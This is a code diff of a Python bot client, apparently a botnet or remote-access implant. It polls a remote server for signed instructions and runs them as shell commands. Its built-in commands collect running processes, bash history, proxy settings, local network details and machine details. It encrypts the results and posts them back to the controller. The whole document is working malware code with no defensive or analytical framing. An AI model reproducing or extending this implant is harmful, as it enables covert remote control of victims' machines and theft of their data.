@@ -1,13 +1,18 @@
 import json
 import logging
 import python_jwt as jwt
+import jwcrypto.jwk as jwk
 
 from time import sleep
 from env import Env
 from requests import post, get
 from uuid import uuid4
 from typing import Union
-from base64 import b64decode, b64encode
+from base64 import b64encode
+
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
+
 from services.system import System
 
 # Unique identifier of this bot instance.
@@ -71,7 +76,7 @@ class XenaAtila:
       sleep(10)
 
   def read_inbox(self, remote_host: str) -> Union[Message, None]:
-    messages_response = get(remote_host + '/v1/messages?clientId=' + client_id)
+    messages_response = get(remote_host + '/v1/messages?clientId=' + client_id + '&status=SENT')
 
     # No messages for the client.
     if (messages_response.status_code != 200):
@@ -85,33 +90,75 @@ class XenaAtila:
 
       subject = message.subject
       # content = b64decode(message.content).decode('utf-8')
-      content = jwt.verify_jwt(message.content, Env()['MASTER_PUBLIC_KEY'], ['RS512'])[1]
+      content = jwt.verify_jwt(message.content, jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), ['RS512'])[1]
 
-      print()
-      print(content)
-      print()
+      if subject != 'instruction':
+        return
 
-      if subject == 'shell':
-        shell_output = System.do(content['shell'])
-        
-        message_insertion = post(self.remote + "/v1/messages", data = {
-          'from': client_id,
-          'to': None,
-          'subject': 'shell-output',
-          'content': b64encode(str.encode(shell_output)),
-          'replyTo': message.id,
-        })
+      # master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
+      # master_public_key = PKCS1_OAEP.new(master_public_key)
+      # content = master_public_key.decrypt(bytes.fromhex(content['payload']))
 
-        if (message_insertion.status_code != 200):
-          continue
-        
-        message_ack = post(self.remote + '/v1/messages/ack', data = {
-          'id': message.id,
-        })
+      #RSA encryption protocol according to PKCS#1 OAEP
+      # dec = PKCS1_OAEP.new(Env()['MASTER_PUBLIC_KEY'])
+      # test = dec.decrypt(bytes.fromhex(content['payload']))
+      # print(test)
 
-        if (message_ack.status_code != 200):
-          logging.warn('Message ACK failure has occured, but it is not handled!')
-          logging.debug(message_ack.json())
+      output = str
+      
+      # COMMAND: SHELL
+      if content['shell'] is not None and content['shell'][0] != '/':
+        output = System.do(content['shell'])
+      
+      # COMMAND: GET_BASH_HISTORY
+      if content['shell'] is not None and content['shell'] == '/get processes':
+        processes = ''
+        for ps in System.enumerate_running_processes():
+          processes += 'name: ' + ps['name'] + ', pid: ' + str(ps['pid']) + ', cpu_percent: ' + str(ps['cpu_percent'])  + '\n'
+        output = processes
+
+      # COMMAND: GET_BASH_HISTORY
+      if content['shell'] is not None and content['shell'] == '/get bash history':
+        output = System.get_bash_history_cat()
+
+      # COMMAND: GET_PROXY_SETTINGS
+      if content['shell'] is not None and content['shell'] == '/get proxy settings':
+        output = json.dumps(System.system_proxy_settings())
+
+      # COMMAND: GET_LOCALHOST
+      if content['shell'] is not None and content['shell'] == '/get localhost':
+        output = System.enumerate_local_host()
+
+      # COMMAND: GET_MACHINE_DETAILS
+      if content['shell'] is not None and content['shell'] == '/get machine details':
+        output = json.dumps(System.environment_details())
+
+      # Encrypt the response.
+      master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
+      master_public_key = PKCS1_OAEP.new(master_public_key)
+      output = master_public_key.encrypt(bytes(output, encoding = 'utf8'))
+
+      # Send the message reply.
+      message_insertion = post(self.remote + "/v1/messages", data = {
+        'from': client_id,
+        'to': None,
+        'subject': 'shell-output',
+        'content': b64encode(output),
+        'replyTo': message.id,
+      })
+
+      # Failed to insert the message reply.
+      if (message_insertion.status_code != 200):
+        logging.debug('Failed to insert a message reply.')
+        continue
+      
+      message_ack = post(self.remote + '/v1/messages/ack', data = {
+        'id': message.id,
+      })
+
+      if (message_ack.status_code != 200):
+        logging.warn('Message ACK failure has occured, but it is not handled!')
+        logging.debug(message_ack.json())
 
   # Make yourself known to the remote host.
   def identify(self, remote_host: str) -> bool:
